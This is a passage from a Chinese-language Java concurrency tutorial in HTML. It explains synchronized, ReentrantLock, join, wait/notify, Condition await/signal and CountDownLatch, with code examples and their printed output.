<span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>它只作用于同一个对象，如果调用两个对象上的同步代码块，就不会进行同步。</p><p>对于以下代码，使用 ExecutorService 执行了两个线程，由于调用的是同一个对象的同步代码块，因此这两个线程会进行同步，当一个线程进入同步语句块时，另一个线程就必须等待。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SynchronizedExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SynchronizedExample e1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SynchronizedExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> e1<span class="token punctuation">.</span><span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> e1<span class="token punctuation">.</span><span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token number">0</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token number">6</span> <span class="token number">7</span> <span class="token number">8</span> <span class="token number">9</span> <span class="token number">0</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token number">6</span> <span class="token number">7</span> <span class="token number">8</span> <span class="token number">9</span></code></pre><p>对于以下代码，两个线程调用了不同对象的同步代码块，因此这两个线程就不需要同步。从输出结果可以看出，两个线程交叉执行。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SynchronizedExample e1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SynchronizedExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    SynchronizedExample e2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SynchronizedExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> e1<span class="token punctuation">.</span><span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> e2<span class="token punctuation">.</span><span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">1</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token number">5</span> <span class="token number">6</span> <span class="token number">6</span> <span class="token number">7</span> <span class="token number">7</span> <span class="token number">8</span> <span class="token number">8</span> <span class="token number">9</span> <span class="token number">9</span></code></pre><p><strong>2. 同步一个方法</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">func</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span></code></pre><p>它和同步代码块一样，作用于同一个对象。</p><p><strong>3. 同步一个类</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>SynchronizedExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>作用于整个类，也就是说两个线程调用同一个类的不同对象上的这种同步语句，也会进行同步。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SynchronizedExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>SynchronizedExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SynchronizedExample e1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SynchronizedExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    SynchronizedExample e2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SynchronizedExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> e1<span class="token punctuation">.</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> e2<span class="token punctuation">.</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token number">0</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token number">6</span> <span class="token number">7</span> <span class="token number">8</span> <span class="token number">9</span> <span class="token number">0</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token number">6</span> <span class="token number">7</span> <span class="token number">8</span> <span class="token number">9</span></code></pre><p><strong>4. 同步一个静态方法</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span></code></pre><p>作用于整个类。</p><h2 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h2><p>ReentrantLock 是 java.util.concurrent（J.U.C）包中的锁。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LockExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Lock lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 确保释放锁，从而避免发生死锁。</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    LockExample lockExample <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LockExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> lockExample<span class="token punctuation">.</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> lockExample<span class="token punctuation">.</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token number">0</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token number">6</span> <span class="token number">7</span> <span class="token number">8</span> <span class="token number">9</span> <span class="token number">0</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token number">6</span> <span class="token number">7</span> <span class="token number">8</span> <span class="token number">9</span></code></pre><h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p><strong>1. 锁的实现</strong></p><p>synchronized 是 JVM 实现的，而 ReentrantLock 是 JDK 实现的。</p><p><strong>2. 性能</strong></p><p>新版本 Java 对 synchronized 进行了很多优化，例如自旋锁等，synchronized 与 ReentrantLock 大致相同。</p><p><strong>3. 等待可中断</strong></p><p>当持有锁的线程长期不释放锁的时候，正在等待的线程可以选择放弃等待，改为处理其他事情。</p><p>ReentrantLock 可中断，而 synchronized 不行。</p><p><strong>4. 公平锁</strong></p><p>公平锁是指多个线程在等待同一个锁时，必须按照申请锁的时间顺序来依次获得锁。</p><p>synchronized 中的锁是非公平的，ReentrantLock 默认情况下也是非公平的，但是也可以是公平的。</p><p><strong>5. 锁绑定多个条件</strong></p><p>一个 ReentrantLock 可以同时绑定多个 Condition 对象。</p><h2 id="使用选择"><a href="#使用选择" class="headerlink" title="使用选择"></a>使用选择</h2><p>除非需要使用 ReentrantLock 的高级功能，否则优先使用 synchronized。这是因为 synchronized 是 JVM 实现的一种锁机制，JVM 原生地支持它，而 ReentrantLock 不是所有的 JDK 版本都支持。并且使用 synchronized 不用担心没有释放锁而导致死锁问题，因为 JVM 会确保锁的释放。</p><h1 id="六、线程之间的协作"><a href="#六、线程之间的协作" class="headerlink" title="六、线程之间的协作"></a>六、线程之间的协作</h1><p>当多个线程可以一起工作去解决某个问题时，如果某些部分必须在其它部分之前完成，那么就需要对线程进行协调。</p><h2 id="join"><a href="#join" class="headerlink" title="join()"></a>join()</h2><p>在线程中调用另一个线程的 join() 方法，会将当前线程挂起，而不是忙等待，直到目标线程结束。</p><p>对于以下代码，虽然 b 线程先启动，但是因为在 b 线程中调用了 a 线程的 join() 方法，b 线程会等待 a 线程结束才继续执行，因此最后能够保证 a 线程的输出先于 b 线程的输出。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JoinExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> A a<span class="token punctuation">;</span>        <span class="token function">B</span><span class="token punctuation">(</span>A a<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>a <span class="token operator">=</span> a<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                a<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        A a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        B b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        b<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    JoinExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JoinExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    example<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>AB</code></pre><h2 id="wait-notify-notifyAll"><a href="#wait-notify-notifyAll" class="headerlink" title="wait() notify() notifyAll()"></a>wait() notify() notifyAll()</h2><p>调用 wait() 使得线程等待某个条件满足，线程在等待时会被挂起，当其他线程的运行使得这个条件满足时，其它线程会调用 notify() 或者 notifyAll() 来唤醒挂起的线程。</p><p>它们都属于 Object 的一部分，而不属于 Thread。</p><p>只能用在同步方法或者同步控制块中使用，否则会在运行时抛出 IllegalMonitorStateException。</p><p>使用 wait() 挂起期间，线程会释放锁。这是因为，如果没有释放锁，那么其它线程就无法进入对象的同步方法或者同步控制块中，那么就无法执行 notify() 或者 notifyAll() 来唤醒挂起的线程，造成死锁。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WaitNotifyExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"before"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">after</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"after"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    WaitNotifyExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WaitNotifyExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> example<span class="token punctuation">.</span><span class="token function">after</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> example<span class="token punctuation">.</span><span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>beforeafter</code></pre><p><strong>wait() 和 sleep() 的区别</strong></p><ul><li>wait() 是 Object 的方法，而 sleep() 是 Thread 的静态方法；</li><li>wait() 会释放锁，sleep() 不会。</li></ul><h2 id="await-signal-signalAll"><a href="#await-signal-signalAll" class="headerlink" title="await() signal() signalAll()"></a>await() signal() signalAll()</h2><p>java.util.concurrent 类库中提供了 Condition 类来实现线程之间的协调，可以在 Condition 上调用 await() 方法使线程等待，其它线程调用 signal() 或 signalAll() 方法唤醒等待的线程。</p><p>相比于 wait() 这种等待方式，await() 可以指定等待的条件，因此更加灵活。</p><p>使用 Lock 来获取一个 Condition 对象。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AwaitSignalExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Lock lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> Condition condition <span class="token operator">=</span> lock<span class="token punctuation">.</span><span class="token function">newCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"before"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            condition<span class="token punctuation">.</span><span class="token function">signalAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">after</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            condition<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"after"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    AwaitSignalExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AwaitSignalExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> example<span class="token punctuation">.</span><span class="token function">after</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> example<span class="token punctuation">.</span><span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>beforeafter</code></pre><h1 id="七、J-U-C-AQS"><a href="#七、J-U-C-AQS" class="headerlink" title="七、J.U.C - AQS"></a>七、J.U.C - AQS</h1><p>java.util.concurrent（J.U.C）大大提高了并发性能，AQS 被认为是 J.U.C 的核心。</p><h2 id="CountdownLatch"><a href="#CountdownLatch" class="headerlink" title="CountdownLatch"></a>CountdownLatch</h2><p>用来控制一个线程等待多个线程。</p><p>维护了一个计数器 cnt，每次调用 countDown() 方法会让计数器的值减 1，减到 0 的时候，那些因为调用 await() 方法而在等待的线程就会被唤醒。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/CountdownLatch.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/CountdownLatch.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CountdownLatchExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>        <span class="token keyword">final</span> <span class="token keyword">int</span> totalThread <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        CountDownLatch countDownLatch <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span>totalThread<span class="token punctuation">)</span><span class="token punctuation">;</span>        ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> totalThread<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"run.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                countDownLatch<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token 